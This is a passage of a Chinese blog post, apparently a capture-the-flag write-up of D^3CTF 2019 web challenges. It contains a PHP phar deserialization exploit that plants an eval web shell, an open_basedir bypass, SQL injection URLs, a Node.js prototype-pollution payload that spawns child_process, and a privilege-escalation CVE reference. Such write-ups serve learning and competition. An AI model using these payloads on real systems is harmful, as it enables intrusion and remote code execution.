&#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>filename</code>为我们上传的文件的相对路径，先放到vps上，压缩成<code>gz</code>，重命名为1</p>
+<p><img src="https://i.loli.net/2019/11/27/vdVAHwKnIbmN6pc.png" alt="Snipaste_2019-11-27_11-19-51.png"></p>
+<p>phar反序列化</p>
+<p><img src="https://i.loli.net/2019/11/27/M3xAYDjqUwGeQgC.png" alt="Snipaste_2019-11-27_11-19-15.png"></p>
+<p>那么我们的绝对路径就知道了，<code>/var/www/html/50f3c73883917b44/e9afd20997dff75e292259158f0006fb</code>，我本来还想再看上一级目录，提示<code>hacker!!</code>，应该是压缩后仍然被检测到了某些字符。。直接一下步</p>
+<p>利用反序列化写<code>.txt</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dir&#123;</span><br><span class="line">		public $userdir;</span><br><span class="line">	    public $url;</span><br><span class="line">	    public $filename;</span><br><span class="line">	    public function __construct($url,$filename) &#123;</span><br><span class="line">	        $this-&gt;url &#x3D; $url;</span><br><span class="line">	        $this-&gt;filename  &#x3D;  $filename;</span><br><span class="line">	    &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;);</span><br><span class="line">    $a -&gt; filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;6d4bcfa605eacb74&#x2F;upload&#x2F;e9afd20997dff75e292259158f0006fb&#x2F;glotozz&#39;;</span><br><span class="line">    $a -&gt; userdir &#x3D; &#39;&lt;?php phpinfo();eval($_POST[cmd]);?&gt;&#39;;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $phar-&gt;setMetadata($a); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/27/oEMqHGc9VDJNvrX.png" alt="Snipaste_2019-11-27_11-44-46.png"></p>
+<p><img src="https://i.loli.net/2019/11/27/l3hdoCLcsYvGqrU.png" alt="Snipaste_2019-11-27_11-45-12.png"></p>
+<p><img src="https://i.loli.net/2019/11/27/4e2nM9P8QAtsRjU.png" alt="Snipaste_2019-11-27_12-36-35.png"></p>
+<p>又是老套路。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/27/2xOCqmYKzutWy4d.png" alt="Snipaste_2019-11-27_11-47-34.png"></p>
+<p><strong><code>webroot in /var/www/html+webroot changes</code>一般就是再加一个沙箱</strong></p>
+<p><strong>.htaccess的其他写法<code>AddHandler php7-script .txt</code></strong></p>
+<p><strong>__destruct()的路径为根目录</strong></p>
+<p><strong>phar压缩(⽤gzip)绕过字符检测</strong></p>
+<p><strong><code>glob://</code>也可以用来绕过open_basedir。。。。</strong></p>
+<h3><span id></span></h3><h3><span id="ezts">ezts</span></h3><p>======未完待续</p>
+<p>卧槽，，环境关了。。那么记录下思路</p>
+<blockquote>
+<p>KOA框架<a href="https://github.com/koajs/koa" target="_blank" rel="noopener">https://github.com/koajs/koa</a><br><a href="https://github.com/d-band/koa-orm" target="_blank" rel="noopener">https://github.com/d-band/koa-orm</a></p>
+</blockquote>
+<p>我感觉之后wp这个应该是<code>fuzz</code>出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20((%271&amp;value&#x3D;1</span><br><span class="line">http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%201%23&amp;value&#x3D;1</span><br><span class="line">http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20(ascii(substr((select%20version()),1,1))%3E10)%23&amp;value&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>盲注脚本出admin账号密码</p>
+<p>原型链污染</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execS...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/flag 是root 400权限, 现在是node⽤⼾,</p>
+</blockquote>
+<p>还需要提权一下</p>
+<blockquote>
+<p>CVE-2019-14287</p>
+</blockquote>
+<h3><span id="参考链接">参考链接:</span></h3><p> <a href="https://wx.zsxq.com/dweb2/index/group/824215518412" target="_blank" rel="noopener">https://wx.zsxq.com/dweb2/index/group/824215518412</a> </p>
+<p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/#ezupload" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">tp6.0.0反序列化漏洞分析</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/">
+        <span class="next-text nav-default">LFIToRCE思路</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
